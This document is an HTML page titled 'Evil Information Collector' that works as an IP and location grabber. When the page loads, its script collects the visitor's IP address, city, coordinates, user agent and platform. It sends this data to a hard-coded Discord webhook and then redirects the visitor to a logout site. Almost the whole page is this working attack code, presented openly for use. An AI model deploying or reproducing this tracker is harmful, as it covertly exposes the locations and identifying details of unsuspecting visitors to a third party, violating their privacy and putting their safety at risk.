<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Evil Information Collector</title>
</head>
<body>
    <h1>Oto grabber !</h1>
    <p>Your ip and location has been send sorry!</p>

    <!-- Include jQuery library -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <script>
        // Function to gather information and send it to your webhook
        function gatherAndSendInfo() {
            // Get IP address using a third-party service
            fetch('https://api.ipify.org/?format=json')
            .then(response => response.json())
            .then(ipData => {
                // Get location information using Geolocation-DB API
                return $.getJSON('https://geolocation-db.com/json/')
                .then(location => {
                    // Prepare the data payload to send to the webhook
                    let details = `Country: ${location.country_name},
                        State: ${location.state},
                        City: ${location.city},
                        Latitude: ${location.latitude},
                        Longitude: ${location.longitude},
                        IP: ${location.IPv4}`;
                    let infoPayload = {
                        content: `Evil Information Collector:
                            IP: ${ipData.ip}
                            Location Details:
                            ${details}
                            User Agent: ${navigator.userAgent}
                            Language: ${navigator.language}
                            Platform: ${navigator.platform}`
                    };

                    // Send the data to your webhook
                    return fetch('https://discord.com/api/webhooks/1226675190612758580/lhGStDkGIetoCqKyt2KcLMaeJW2KxtWtVMclcZoiV13osRHo4cPYHeCq5LfR7Drhlvw-', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(infoPayload)
                    });
                });
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Error sending information to webhook:', response.status);
                }
            })
            .catch(error => {
                console.error('Error sending information to webhook:', error);
            });
        }

        // Call the function to start the evil process
        gatherAndSendInfo();

        // Redirect after 1 second
        setTimeout(function() {
            window.location.replace('https://superlogout.com/');
        }, 1000);
    </script>
</body>
</html>
